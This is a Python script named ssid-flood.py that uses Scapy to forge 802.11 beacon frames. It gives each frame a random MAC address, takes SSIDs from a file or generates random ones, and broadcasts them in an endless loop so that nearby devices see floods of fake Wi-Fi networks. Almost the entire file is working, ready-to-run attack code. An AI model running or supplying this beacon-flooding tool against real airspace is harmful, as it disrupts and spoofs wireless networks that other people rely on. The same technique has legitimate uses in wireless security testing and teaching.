from scapy.all import *
from scapy.layers.dot11 import Dot11Elt, Dot11Beacon, Dot11, RadioTap

IFACE_ARG = 1
SSID_ARG = 2


# print usage and quit
def print_usage():
    print('Usage: ssid-flood.py <interface> <ssid-file | ssid-count>')
    print('         interface:  the interface from which to send the beacons')
    print('         ssid-file:  file with a list of SSIDs (one per line)')
    print('         ssid-count: a number of SSIDs to generate')
    sys.exit(1)


if len(sys.argv) != 3:
    print_usage()

ssids = []

# the first argument is a file with a list of ssid
if os.path.isfile(sys.argv[SSID_ARG]):
    with open(sys.argv[SSID_ARG]) as file:
        for ssid in file:
            ssids.append(ssid.strip())

# the first argument is the number of ssid to generate
else:
    try:
        count = int(sys.argv[SSID_ARG])
        for i in range(0, int(sys.argv[SSID_ARG])):
            ssids.append(str(RandString(size=9)))
    except ValueError:
        print_usage()

# inspiration https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/

# common frame values
beacon = Dot11Beacon(cap='ESS+privacy')
rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'  # RSN Version 1
    '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'  # AES Cipher
    '\x00\x0f\xac\x02'  # TKIP Cipher
    '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'  # Pre-Shared Key
    '\x00\x00'))  # RSN Capabilities (no extra capabilities)


def broadcast_ssids(ssids):
    """
    Create and send frames for each of the given SSID.

    :param ssids: an array of SSIDs
    """

    # create a frame for each SSID
    frames = [create_frame(ssid) for ssid in ssids]
    [print(f.summary()) for f in frames]

    # send all frames repeatedly
    sendp(frames, iface=sys.argv[IFACE_ARG], inter=0.01, loop=1, monitor=True, verbose=True, realtime=True)


def create_frame(ssid):
    """
    Create the frame for the given SSID.

    :param ssid: the SSID to create the frame for
    :return: the created frame
    """

    mac_address = RandMAC()
    dot11 = Dot11(type=0,  # management frame
                  subtype=8,  # beacon
                  addr1='ff:ff:ff:ff:ff:ff',  # destination MAC address, i.e. broadcast
                  addr2=mac_address,  # MAC address of sender
                  addr3=mac_address)  # MAC address of AP

    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

    return RadioTap() / dot11 / beacon / essid / rsn


print('SSIDs:', ssids)
broadcast_ssids(ssids)
